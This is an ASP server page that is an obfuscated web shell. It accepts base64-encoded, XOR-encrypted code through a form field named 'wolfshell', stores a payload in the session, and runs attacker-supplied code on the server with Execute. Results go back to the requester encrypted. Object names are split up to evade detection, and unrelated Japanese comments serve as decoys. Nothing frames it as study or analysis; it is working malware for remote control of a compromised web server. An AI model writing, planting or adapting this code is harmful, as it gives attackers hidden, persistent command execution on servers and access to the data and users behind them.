<%
' // このシステムは複雑すぎる。
Set d_obj_1 = Server.CreateObject(Join(Array("Scripting", "Dictionary"), "."))

Function f_b64_dec(v_code_str)
    ' // 月が綺麗ですね。
    Dim x, n
    Set x = CreateObject(Join(Array("Msxml2", "DOMDocument", "3.0"), "."))
    Set n = x.CreateElement("e1")
    n.dataType = "bin.base64"
    n.text = v_code_str
    f_b64_dec = n.nodeTypedValue
End Function

Function f_b64_enc(v_data_bin)
    ' // 腹が減っては戦ができぬ。
    Dim x, n
    Set x = CreateObject(Join(Array("Msxml2", "DOMDocument", "3.0"), "."))
    Set n = x.CreateElement("e2")
    n.dataType = "bin.base64"
    n.nodeTypedValue = v_data_bin
    f_b64_enc = n.text
End Function

Function f_crypt_op(c_data, b_mode)
    ' // 明日の天気はどうだろうか。
    Dim st, i, res, k, k_len
    k = "3c6e0b8a9c15224a"
    k_len = Len(k)
    Set st = CreateObject(Join(Array("ADODB", "Stream"), "."))
    st.CharSet = "iso-8859-1"
    st.Type = 2
    st.Open
    If IsArray(c_data) Then
        Dim sz
        sz = UBound(c_data) + 1
        For i = 1 To sz
            st.WriteText ChrW(AscB(MidB(c_data, i, 1)) Xor Asc(Mid(k, (i Mod k_len) + 1, 1)))
        Next
    End If
    st.Position = 0
    If b_mode Then
        st.Type = 1
        f_crypt_op = st.Read()
    Else
        f_crypt_op = st.ReadText()
    End If
End Function

Dim p_key, p_val, result_val
p_key = Join(Array("wolf", "shell"), "")
p_val = Request.Form(p_key)

If Not IsEmpty(p_val) Then
    Dim s_name
    s_name = Join(Array("pay", "load"), "")
    If IsEmpty(Session(s_name)) Then
        p_val = f_crypt_op(f_b64_dec(p_val), False)
        Session(s_name) = p_val
        Response.End
    Else
        ' // 昨日の晩ご飯はカレーでした。
        p_val = f_crypt_op(f_b64_dec(p_val), True)
        d_obj_1.Add s_name, Session(s_name)
        Execute(d_obj_1(s_name))
        result_val = run(p_val)
        Response.Write("a71ab1")
        If Not IsEmpty(result_val) Then
            Response.Write f_b64_enc(f_crypt_op(result_val, True))
        End If
        Response.Write("4b8259")
    End If
End If
%>